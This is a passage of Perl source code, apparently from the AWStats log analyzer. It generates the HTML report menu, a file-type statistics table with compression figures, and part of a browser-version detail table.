XMLEncode(\"$AWScript${NewLinkParams}output=urlexit\")\n\t\t\t\t\t: \"$StaticLinks.urlexit.$StaticExt\"\n\t\t\t\t  )\n\t\t\t\t  . \"\\\"$NewLinkTarget>$Message[116]</a>\\n\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($ShowOSStats) {\n\t\t\t\tprint( $frame? \"<tr><td class=\\\"awsm\\\">\" : \"\" );\n\t\t\t\tprint\n\t\t\t\t  \"<a href=\\\"$linkanchor#os\\\"$targetpage>$Message[59]</a>\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($ShowOSStats) {\n\t\t\t\tprint( $frame\n\t\t\t\t\t? \"<tr><td class=\\\"awsm\\\"> &nbsp; <img height=\\\"8\\\" width=\\\"9\\\" src=\\\"$DirIcons/other/page.png\\\" alt=\\\"...\\\" /> \"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t\tprint \"<a href=\\\"\"\n\t\t\t\t  . (\n\t\t\t\t\t$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks\n\t\t\t\t\t? XMLEncode(\n\t\t\t\t\t\t\"$AWScript${NewLinkParams}output=osdetail\")\n\t\t\t\t\t: \"$StaticLinks.osdetail.$StaticExt\"\n\t\t\t\t  )\n\t\t\t\t  . \"\\\"$NewLinkTarget>$Message[58]</a>\\n\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($ShowOSStats) {\n\t\t\t\tprint( $frame\n\t\t\t\t\t? \"<tr><td class=\\\"awsm\\\"> &nbsp; <img height=\\\"8\\\" width=\\\"9\\\" src=\\\"$DirIcons/other/page.png\\\" alt=\\\"...\\\" /> \"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t\tprint \"<a href=\\\"\"\n\t\t\t\t  . (\n\t\t\t\t\t$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks\n\t\t\t\t\t? XMLEncode(\n\t\t\t\t\t\t\"$AWScript${NewLinkParams}output=unknownos\")\n\t\t\t\t\t: \"$StaticLinks.unknownos.$StaticExt\"\n\t\t\t\t  )\n\t\t\t\t  . \"\\\"$NewLinkTarget>$Message[0]</a>\\n\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($ShowBrowsersStats) {\n\t\t\t\tprint( $frame? \"<tr><td class=\\\"awsm\\\">\" : \"\" );\n\t\t\t\tprint\n\"<a href=\\\"$linkanchor#browsers\\\"$targetpage>$Message[21]</a>\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($ShowBrowsersStats) {\n\t\t\t\tprint( $frame\n\t\t\t\t\t? \"<tr><td class=\\\"awsm\\\"> &nbsp; <img height=\\\"8\\\" width=\\\"9\\\" src=\\\"$DirIcons/other/page.png\\\" alt=\\\"...\\\" /> \"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t\tprint \"<a href=\\\"\"\n\t\t\t\t  . (\n\t\t\t\t\t$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks\n\t\t\t\t\t? XMLEncode(\n\t\t\t\t\t\t\"$AWScript${NewLinkParams}output=browserdetail\")\n\t\t\t\t\t: \"$StaticLinks.browserdetail.$StaticExt\"\n\t\t\t\t  )\n\t\t\t\t  . \"\\\"$NewLinkTarget>$Message[58]</a>\\n\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($ShowBrowsersStats) {\n\t\t\t\tprint( $frame\n\t\t\t\t\t? \"<tr><td class=\\\"awsm\\\"> &nbsp; <img height=\\\"8\\\" width=\\\"9\\\" src=\\\"$DirIcons/other/page.png\\\" alt=\\\"...\\\" /> \"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t\tprint \"<a href=\\\"\"\n\t\t\t\t  . (\n\t\t\t\t\t$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks\n\t\t\t\t\t? XMLEncode(\n\t\t\t\t\t\t\"$AWScript${NewLinkParams}output=unknownbrowser\")\n\t\t\t\t\t: \"$StaticLinks.unknownbrowser.$StaticExt\"\n\t\t\t\t  )\n\t\t\t\t  . \"\\\"$NewLinkTarget>$Message[0]</a>\\n\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($ShowScreenSizeStats) {\n\t\t\t\tprint( $frame? \"<tr><td class=\\\"awsm\\\">\" : \"\" );\n\t\t\t\tprint\n\"<a href=\\\"$linkanchor#screensizes\\\"$targetpage>$Message[135]</a>\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($linetitle) { print( $frame? \"\" : \"</td></tr>\\n\" ); }\n\n\t\t\t# Referers\n\t\t\t%menu = (\n\t\t\t\t'referer'      => $ShowOriginStats ? 1 : 0,\n\t\t\t\t'refererse'    => $ShowOriginStats ? 2 : 0,\n\t\t\t\t'refererpages' => $ShowOriginStats ? 3 : 0,\n\t\t\t\t'keys' => ( $ShowKeyphrasesStats || $ShowKeywordsStats )\n\t\t\t\t? 4\n\t\t\t\t: 0,\n\t\t\t\t'keyphrases' => $ShowKeyphrasesStats ? 5 : 0,\n\t\t\t\t'keywords'   => $ShowKeywordsStats   ? 6 : 0\n\t\t\t);\n\t\t\t%menulink = (\n\t\t\t\t'referer'      => 1,\n\t\t\t\t'refererse'    => 2,\n\t\t\t\t'refererpages' => 2,\n\t\t\t\t'keys'         => 1,\n\t\t\t\t'keyphrases'   => 2,\n\t\t\t\t'keywords'     => 2\n\t\t\t);\n\t\t\t%menutext = (\n\t\t\t\t'referer'      => $Message[37],\n\t\t\t\t'refererse'    => $Message[126],\n\t\t\t\t'refererpages' => $Message[127],\n\t\t\t\t'keys'         => $Message[14],\n\t\t\t\t'keyphrases'   => $Message[120],\n\t\t\t\t'keywords'     => $Message[121]\n\t\t\t);\n\t\t\tHTMLShowMenuCateg(\n\t\t\t\t'referers',     $Message[23],\n\t\t\t\t'menu7.png',    $frame,\n\t\t\t\t$targetpage,    $linkanchor,\n\t\t\t\t$NewLinkParams, $NewLinkTarget,\n\t\t\t\t\\%menu,         \\%menulink,\n\t\t\t\t\\%menutext\n\t\t\t);\n\n\t\t\t# Others\n\t\t\t%menu = (\n\t\t\t\t'filetypes' => ( $ShowFileTypesStats =~ /C/i ) ? 1 : 0,\n\t\t\t\t'misc' => $ShowMiscStats ? 2 : 0,\n\t\t\t\t'errors' => ( $ShowHTTPErrorsStats || $ShowSMTPErrorsStats )\n\t\t\t\t? 3\n\t\t\t\t: 0,\n\t\t\t\t'clusters' => $ShowClusterStats ? 5 : 0\n\t\t\t);\n\t\t\t%menulink = (\n\t\t\t\t'filetypes' => 1,\n\t\t\t\t'misc'      => 1,\n\t\t\t\t'errors'    => 1,\n\t\t\t\t'clusters'  => 1\n\t\t\t);\n\t\t\t%menutext = (\n\t\t\t\t'filetypes' => $Message[98],\n\t\t\t\t'misc'      => $Message[139],\n\t\t\t\t'errors'    =>\n\t\t\t\t  ( $ShowSMTPErrorsStats ? $Message[147] : $Message[32] ),\n\t\t\t\t'clusters' => $Message[155]\n\t\t\t);\n\t\t\tmy $idx = 0;\n\t\t\tforeach ( sort keys %TrapInfosForHTTPErrorCodes ) {\n\t\t\t\t$menu{\"errors$_\"}     = $ShowHTTPErrorsStats ? 4+$idx : 0;\n\t\t\t\t$menulink{\"errors$_\"} = 2;\n\t\t\t\t$menutext{\"errors$_\"} = $Message[49] . ' (' . $_ . ')';\n\t\t\t\t$idx++;\n\t\t\t}\n\t\t\tHTMLShowMenuCateg(\n\t\t\t\t'others',       $Message[2],\n\t\t\t\t'menu8.png',    $frame,\n\t\t\t\t$targetpage,    $linkanchor,\n\t\t\t\t$NewLinkParams, $NewLinkTarget,\n\t\t\t\t\\%menu,         \\%menulink,\n\t\t\t\t\\%menutext\n\t\t\t);\n\n\t\t\t# Extra/Marketing\n\t\t\t%menu     = ();\n\t\t\t%menulink = ();\n\t\t\t%menutext = ();\n\t\t\tmy $i = 1;\n\t\t\tforeach ( 1 .. @ExtraName - 1 ) {\n\t\t\t\t$menu{\"extra$_\"}        = $i++;\n\t\t\t\t$menulink{\"extra$_\"}    = 1;\n\t\t\t\t$menutext{\"extra$_\"}    = $ExtraName[$_];\n\t\t\t\t$menu{\"allextra$_\"}     = $i++;\n\t\t\t\t$menulink{\"allextra$_\"} = 2;\n\t\t\t\t$menutext{\"allextra$_\"} = $Message[80];\n\t\t\t}\n\t\t\tHTMLShowMenuCateg(\n\t\t\t\t'extra',        $Message[134],\n\t\t\t\t'',             $frame,\n\t\t\t\t$targetpage,    $linkanchor,\n\t\t\t\t$NewLinkParams, $NewLinkTarget,\n\t\t\t\t\\%menu,         \\%menulink,\n\t\t\t\t\\%menutext\n\t\t\t);\n\t\t\tprint \"</table>\\n\";\n\t\t}\n\t\telse {\n\n\t\t\t# Menu Applet\n\t\t\tif ($frame) { }\n\t\t\telse { }\n\t\t}\n\n\t\t#print ($frame?\"\":\"<br />\\n\");\n\t\tprint \"<br />\\n\";\n\t}\n\n\t# Print Back link\n\telsif ( !$HTMLOutput{'main'} ) {\n\t\tprint \"<table>\\n\";\n\t\t$NewLinkParams =~ s/(^|&|&amp;)hostfilter=[^&]*//i;\n\t\t$NewLinkParams =~ s/(^|&|&amp;)urlfilter=[^&]*//i;\n\t\t$NewLinkParams =~ s/(^|&|&amp;)refererpagesfilter=[^&]*//i;\n\t\t$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;\n\t\t$NewLinkParams =~ s/^&amp;//;\n\t\t$NewLinkParams =~ s/&amp;$//;\n\t\tif (   !$DetailedReportsOnNewWindows\n\t\t\t|| $FrameName eq 'mainright'\n\t\t\t|| $QueryString =~ /buildpdf/i )\n\t\t{\n\t\t\tprint \"<tr><td class=\\\"aws\\\"><a href=\\\"\"\n\t\t\t  . (\n\t\t\t\t$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks\n\t\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}\")\n\t\t\t\t: \"$StaticLinks.$StaticExt\"\n\t\t\t  )\n\t\t\t  . \"\\\">$Message[76]</a></td></tr>\\n\";\n\t\t}\n\t\telse {\n\t\t\tprint\n\"<tr><td class=\\\"aws\\\"><a href=\\\"javascript:parent.window.close();\\\">$Message[118]</a></td></tr>\\n\";\n\t\t}\n\t\tprint \"</table>\\n\";\n\t\tprint \"\\n\";\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the File Type table\n# Parameters:   _\n# Input:        $NewLinkParams, $NewLinkTargets\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainFileType{\n    my $NewLinkParams = shift;\n    my $NewLinkTarget = shift;\n\tif (!$LevelForFileTypesDetection > 0){return;}\n\tif ($Debug) { debug( \"ShowFileTypesStatsCompressionStats\", 2 ); }\n\tprint \"$Center<a name=\\\"filetypes\\\">&nbsp;</a><br />\\n\";\n\tmy $Totalh = 0;\n\tforeach ( keys %_filetypes_h ) { $Totalh += $_filetypes_h{$_}; }\n\tmy $Totalk = 0;\n\tforeach ( keys %_filetypes_k ) { $Totalk += $_filetypes_k{$_}; }\n\tmy $title = \"$Message[73]\";\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n        # extend the title to include the added link \n        $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n           \"$AddLinkToExternalCGIWrapper\" . \"?section=FILETYPES&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    } \n\n\tif ( $ShowFileTypesStats =~ /C/i ) { $title .= \" - $Message[98]\"; }\n\t\n\t# build keylist at top\n\t&BuildKeyList( $MaxRowsInHTMLOutput, 1, \\%_filetypes_h,\n\t\t\\%_filetypes_h );\n\t\t\n\t&tab_head( \"$title\", 19, 0, 'filetypes' );\n\t\t\n\t# Graph the top five in a pie chart\n\tif (scalar @keylist > 1){\n\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t\t{\n\t\t\tmy @blocklabel = ();\n\t\t\tmy @valdata = ();\n\t\t\tmy @valcolor = ($color_p);\n\t\t\tmy $cnt = 0;\n\t\t\tforeach my $key (@keylist) {\n\t\t\t\tpush @valdata, int( $_filetypes_h{$key} / $Totalh * 1000 ) / 10;\n\t\t\t\tpush @blocklabel, \"$key\";\n\t\t\t\t$cnt++;\n\t\t\t\tif ($cnt > 4) { last; }\n\t\t\t}\n\t\t\tprint \"<tr><td colspan=\\\"7\\\">\";\n\t\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t\t&$function(\n\t\t\t\t\"$Message[73]\",              \"filetypes\",\n\t\t\t\t0, \t\t\t\t\t\t\\@blocklabel,\n\t\t\t\t0,           \t\t\t\\@valcolor,\n\t\t\t\t0,              \t\t0,\n\t\t\t\t0,          \t\t\t\\@valdata\n\t\t\t);\n\t\t\tprint \"</td></tr>\";\n\t\t}\n\t}\n\t\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th colspan=\\\"3\\\">$Message[73]</th>\";\n\n\tif ( $ShowFileTypesStats =~ /H/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(4)\n\t\t  . \">$Message[57]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th>\";\n\t}\n\tif ( $ShowFileTypesStats =~ /B/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(5)\n\t\t  . \">$Message[75]</th><th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[15]</th>\";\n\t}\n\tif ( $ShowFileTypesStats =~ /C/i ) {\n\t\tprint\n\"<th bgcolor=\\\"#$color_k\\\" width=\\\"100\\\">$Message[100]</th><th bgcolor=\\\"#$color_k\\\" width=\\\"100\\\">$Message[101]</th><th bgcolor=\\\"#$color_k\\\" width=\\\"100\\\">$Message[99]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\tmy $total_con = 0;\n\tmy $total_cre = 0;\n\tmy $count     = 0;\n\tforeach my $key (@keylist) {\n\t\tmy $p_h = '&nbsp;';\n\t\tmy $p_k = '&nbsp;';\n\t\tif ($Totalh) {\n\t\t\t$p_h = int( $_filetypes_h{$key} / $Totalh * 1000 ) / 10;\n\t\t\t$p_h = \"$p_h %\";\n\t\t}\n\t\tif ($Totalk) {\n\t\t\t$p_k = int( $_filetypes_k{$key} / $Totalk * 1000 ) / 10;\n\t\t\t$p_k = \"$p_k %\";\n\t\t}\n\t\tif ( $key eq 'Unknown' ) {\n\t\t\tprint \"<tr><td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/mime\\/unknown.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\" colspan=\\\"2\\\"><span style=\\\"color: #$color_other\\\">$Message[0]</span></td>\";\n\t\t}\n\t\telse {\n\t\t\tmy $nameicon = $MimeHashLib{$key}[0] || \"notavailable\";\n\t\t\tmy $nametype = $MimeHashFamily{$MimeHashLib{$key}[0]} || \"&nbsp;\";\n\t\t\tprint \"<tr><td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/mime\\/$nameicon.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\">$key</td>\";\n\t\t\tprint \"<td class=\\\"aws\\\">$nametype</td>\";\n\t\t}\n\t\tif ( $ShowFileTypesStats =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($_filetypes_h{$key}).\"</td><td>$p_h</td>\";\n\t\t}\n\t\tif ( $ShowFileTypesStats =~ /B/i ) {\n\t\t\tprint '<td nowrap=\"nowrap\">'\n\t\t\t  . Format_Bytes( $_filetypes_k{$key} )\n\t\t\t  . \"</td><td>$p_k</td>\";\n\t\t}\n\t\tif ( $ShowFileTypesStats =~ /C/i ) {\n\t\t\tif ( $_filetypes_gz_in{$key} ) {\n\t\t\t\tmy $percent = int(\n\t\t\t\t\t100 * (\n\t\t\t\t\t\t1 - $_filetypes_gz_out{$key} /\n\t\t\t\t\t\t  $_filetypes_gz_in{$key}\n\t\t\t\t\t)\n\t\t\t\t);\n\t\t\t\tprintf(\n\t\t\t\t\t\"<td>%s</td><td>%s</td><td>%s (%s%)</td>\",\n\t\t\t\t\tFormat_Bytes( $_filetypes_gz_in{$key} ),\n\t\t\t\t\tFormat_Bytes( $_filetypes_gz_out{$key} ),\n\t\t\t\t\tFormat_Bytes(\n\t\t\t\t\t\t$_filetypes_gz_in{$key} -\n\t\t\t\t\t\t  $_filetypes_gz_out{$key}\n\t\t\t\t\t),\n\t\t\t\t\t$percent\n\t\t\t\t);\n\t\t\t\t$total_con += $_filetypes_gz_in{$key};\n\t\t\t\t$total_cre += $_filetypes_gz_out{$key};\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprint \"<td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td>\";\n\t\t\t}\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\t$count++;\n\t}\n\n\t# Add total (only useful if compression is enabled)\n\tif ( $ShowFileTypesStats =~ /C/i ) {\n\t\tmy $colspan = 3;\n\t\tif ( $ShowFileTypesStats =~ /H/i ) { $colspan += 2; }\n\t\tif ( $ShowFileTypesStats =~ /B/i ) { $colspan += 2; }\n\t\tprint \"<tr>\";\n\t\tprint\n\"<td class=\\\"aws\\\" colspan=\\\"$colspan\\\"><b>$Message[98]</b></td>\";\n\t\tif ( $ShowFileTypesStats =~ /C/i ) {\n\t\t\tif ($total_con) {\n\t\t\t\tmy $percent =\n\t\t\t\t  int( 100 * ( 1 - $total_cre / $total_con ) );\n\t\t\t\tprintf(\n\t\t\t\t\t\"<td>%s</td><td>%s</td><td>%s (%s%)</td>\",\n\t\t\t\t\tFormat_Bytes($total_con),\n\t\t\t\t\tFormat_Bytes($total_cre),\n\t\t\t\t\tFormat_Bytes( $total_con - $total_cre ),\n\t\t\t\t\t$percent\n\t\t\t\t);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprint \"<td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td>\";\n\t\t\t}\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Browser Detail frame or static page\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowBrowserDetail{\n\t# Show browsers versions\n\tprint \"$Center<a name=\\\"browsersversions\\\">&nbsp;</a><br />\";\n\tmy $title = \"$Message[21]\";\n\t&tab_head( \"$title\", 19, 0, 'browsersversions' );\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th colspan=\\\"2\\\">$Message[58]</th>\";\n\tprint\n\"<th width=\\\"80\\\">$Message[111]</th><th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th><th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[15]</th>\";\n\tprint\n\"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th>\";\n\tprint \"<th>&nbsp;</th>\";\n\tprint \"</tr>\\n\";\n\tmy $total_h = 0;\n\tmy $total_p = 0;\n\tmy $count = 0;\n\t&BuildKeyList( MinimumButNoZero( scalar keys %_browser_h, 500 ),\n\t\t1, \\%_browser_h, \\%_browser_p );\n\tmy %keysinkeylist = ();\n\tmy $max_h = 1;\n\tmy $max_p = 1;\n\n\t# Count total by family\n\tmy %totalfamily_h = ();\n\tmy %totalfamily_p = ();\n\tmy $TotalFamily_h = 0;\n\tmy $TotalFamily_p = 0;\n  BROWSERLOOP: foreach my $key (@keylist) {\n\t\t$total_h += $_browser_h{$key};\n\t\tif ( $_browser_h{$key} > $max_h ) {\n\t\t\t$max_h = $_browser_h{$key};\n\t\t}\n\t\t$total_p += $_browser_p{$key};\n\t\tif ( $_browser_p{$key} > $max_p ) {\n\t\t\t$max_p = $_browser_p{$key};\n\t\t}\n\t\tforeach my $family ( keys %BrowsersFamily ) {\n\t\t\tif ( $key =~ /^$family/i ) {\n\t\t\t\t$totalfamily_h{$family} += $_browser_h{$key};\n\t\t\t\t$totalfamily_p{$family} += $_browser_p{$key};\n\t\t\t\t$TotalFamily_h          += $_browser_h{$key};\n\t\t\t\t$TotalFamily_p          += $_browser_p{$key};\n\t\t\t\tnext BROWSERLOOP;\n\t\t\t}\n\t\t}\n\t}\n\n\t# Write records grouped in a browser family\n\tforeach my $family (\n\t\tsort { $BrowsersFamily{$a} <=> $BrowsersFamily{$b} }\n\t\tkeys %BrowsersFamily\n\t  )\n\t{\n\t\tmy $p_h = '&nbsp;';\n\t\tmy $p_p = '&nbsp;';\n\t\tif ($total_h) {\n\t\t\t$p_h = int( $totalfamily_h{$family} / $total_h * 1000 ) / 10;\n\t\t\t$p_h = \"$p_h %\";\n\t\t}\n\t\tif ($total_p) {\n\t\t\t$p_p = int( $totalfamily_p{$family} / $total_p * 1000 ) / 10;\n\t\t\t$p_p = \"$p_p %\";\n\t\t}\n\t\tmy $familyheadershown = 0;\n\n\t\t#foreach my $key ( reverse sort keys %_browser_h ) {\n\t\tforeach my $key ( reverse sort SortBrowsers keys %_browser_h ) {\n\t\t\tif ( $key =~ /^$family(.*)/i ) {\n\t\t\t\tif ( !$familyheadershown ) {\n\t\t\t\t\tprint\n\"<tr bgcolor=\\\"#F6F6F6\\\"><td class=\\\"aws\\\" colspan=\\\"2\\\"><b>\"\n\t\t\t\t  . uc($family)\n\t\t\t\t  . \"</b></td>\";\n\t\t\t\tprint \"<td>&nbsp;</td><td><b>\"\n\t\t\t\t  . Format_Number(int( $totalfamily_p{$family} ))\n\t\t\t\t  . \"</b></td><td><b>$p_p</b></td>\";\n\t\t\t\tprint \"<td><b>\"\n\t\t\t\t  . Format_Number(int( $totalfamily_h{$family} ))\n\t\t\t\t  . \"</b></td><td><b>$p_h</b></td><td>&nbsp;</td>\";\n\t\t\t\tprint \"</tr>\\n\";\n\t\t\t\t$familyheadershown = 1;\n\t\t\t}\n\t\t\t$keysinkeylist{$key} = 1;\n\t\t\tmy $ver = $1;\n\t\t\tmy $p_h = '&nbsp;';\n\t\t\tmy $p_p = '&nbsp;';\n\t\t\tif ($total_h) {\n\t\t\t\t$p_h = \n\t\t\t\t  int( $_browser_h{$key} / $total_h * 1000 ) / 10;\n\t\t\t\t$p_h = \"$p_h %\";\n\t\t\t}\n\t\t\tif ($total_p) {\n\t\t\t\t$p_p =\n\t\t\t\t  int( $_browser_p{$key} / $total_p * 1000 ) / 10;\n\t\t\t\t$p_p = \"$p_p %\";\n\t\t\t}\n\t\t\tprint \"<tr>\";\n\t\t\tprint \"<td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/browser\\/$family.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td>\";\n\t\t\tprint \"<td class=\\\"aws\\\">\"\n\t\t\t  . ucfirst($family) . \" \"\n\t\t\t  . ( $ver ? \"$ver\" : \"?\" ) . \"</td>\";\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$BrowsersHereAreGrabbers{$family}\n\t\t\t\t? \"<b>$Message[112]</b>\"\n\t\t\t\t: \"$Message[113]\"\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t\tmy $bredde_h = 0;\n\t\t\tmy $bredde_p = 0;\n\t\t\tif ( $max_h > 0 ) {\n\t\t\t\t$bredde_h =\n\t\t\t\t  int( $BarWidth * ( $_browser_h{$key} || 0 ) /\n\t\t\t\t\t  $max_h ) + 1;\n\t\t\t}\n\t\t\tif ( ( $bredde_h == 1 ) && $_browser_h{$key} ) {\n\t\t\t\t$bredde_h = 2;\n\t\t\t}\n\t\t\tif ( $max_p > 0 ) {\n\t\t\t\t$bredde_p =\n\t\t\t\t  int( $BarWidth * ( $_browser_p{$key} || 0 ) /\n\t\t\t\t\t  $max_p ) + 1;\n\t\t\t}\n\t\t\tif ( ( $bredde_p == 1 ) && $_browser_p{$key} ) {\n\t\t\t\t$bredde_p = 2;\n\t\t\t}\n\t\t\tprint \"<td>\".Format_Number($_browser_p{$key}).\"</td><td>$p_p</td>\";\n\t\t\tprint \"<td>\".Format_Number($_browser_h{$key}).\"</td><td>$p_h</td>\";\n\t\t\tprint \"<td class=\\\"aws\\\">\";\n\n\t\t\t# alt and title are not provided to reduce page size\n\t\t\tif ($ShowBrowsersStats) {\n\t\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hp'}\\\" width=\\\"$bredde_p\\\" height=\\\"5\\\" /><br />\";\n\t\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hh'}\\\" width=\\\"$bredde_h\\\" height=\\\"5\\\" /><br />\";\n\t\t\t\t}\n\t\t\t\tprint \"</td>\";\n\t\t\t\tprint \"</tr>\\n\";\n\t\t\t\t$count++;\n\t\t\t}\n\t\t}\n\t}\n\n\t# Write other records\n\tmy $familyheadershown = 0;\n\tforeach my $key (@keylist) {\n\t\tif ( $keysinkeylist{$key} ) { next; }\n\t\tif ( !$familyheadershown )  {\n\t\t\tmy $p_h = '&nbsp;';\n\t\t\tmy $p_p = '&nbsp;';\n\t\t\tif ($total_p) {\n\t\t\t\t$p_p =\n\t\t\t\t  int( ( $total_p - $TotalFamily_p ) / $total_p * 1000 ) /\n\t\t\t\t  10;\n\t\t\t\t$p_p = \"$p_p %\";\n\t\t\t}\n\t\t\tif ($total_h) {\n\t\t\t\t$p_h =\n\t\t\t\t  int( ( $total_h - $TotalFamily_h ) / $total_h * 1000 ) /\n\t\t\t\t  10;\n\t\t\t\t$p_h = \"$p_h %\";\n\t\t\t}\n\t\t\tprint\n\"<tr bgcolor=\\\"#F6F6F6\\\"><td class=\\\"aws\\\" colspan=\\\"2\\\"><b>$Message[2]</b></td>\";\n\t\t\tprint \"<td>&nbsp;</td><td><b>\"\n\t\t\t  . Format_Number(( $total_p - $TotalFamily_p ))\n\t\t\t  . \"</b></td><td><b>$p_p</b></td>\";\n\t\t\tprint \"<td><b>\"\n\t\t\t  . Format_Number(( $total_h - $TotalFamily_h ))\n\t\t\t  . \"</b></td><td><b>$p_h</b></td><td>&nbsp;</td>\";\n\t\t\tprint \"</tr>\\n\";\n\t\t\t$familyheadershown = 1;\n\t\t}\n\t\tmy $p_h = '&nbsp;';\n\t\tmy $p_p = '&nbsp;';\n\t\tif ($total_h) {\n\t\t\t$p_h = int( $_browser_h{$key} / $total_h * 1000 ) / 10;\n\t\t\t$p_h = \"$p_h %\";\n\t\t}\n\t\tif ($total_p) {\n\t\t\t$p_p = int( $_browser_p{$key} / $total_p * 1000 ) / 10;\n\t\t\t$p_p = \"$p_p %\";\n\t\t}\n\t\tprint \"<tr>\";\n\t\tif ( $key eq 'Unknown' ) {\n\t\t\tprint \"<td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/browser\\/unknown.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[0]</span></td><td width=\\\"80\\\">?</td>\";\n\t\t}\n\t\telse {\n\t\t\tmy $keywithoutcumul = $key;\n\t\t\t$keywithoutcumul =~ s/cumul$//i;\n\t\t\tmy $libbrowser = $BrowsersHashIDLib{$keywithoutcumul}\n\t\t\t  || $keywithoutcumul;\n\t\t\tmy $nameicon = $BrowsersHashIcon{$keywithoutcumul}\n\t\t\t  || \"notavailable\";\n\t\t\tprint \"<td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/browser\\/$nameicon.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\">$libbrowser</td><td>\"\n\t\t\t  . (\n\t\t\t\t$BrowsersHereAreGrabbers{$key}\n\t\t\t\t? \"<b>$Message[112]</b>\"\n\t\t\t\t: \"$Message[113]\"\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tmy $bredde_h = 0;\n\t\tmy $bredde_p = 0;\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_h =\n\t\t\t  int( $BarWidth * ( $_browser_h{$key} || 0 ) / $max_h ) +\n\t\t\t  1;\n\t\t}\n\t\tif ( $max_p > 0 ) {\n\t\t\t$bredde_p =\n\t\t\t  int( $BarWidth * ( $_browser_p{$key} || 0 ) / $max_p ) +\n\t\t\t  1;\n\t\t}\n\t\tif ( ( $bredde_h == 1 ) && $_browser_h{$key} ) 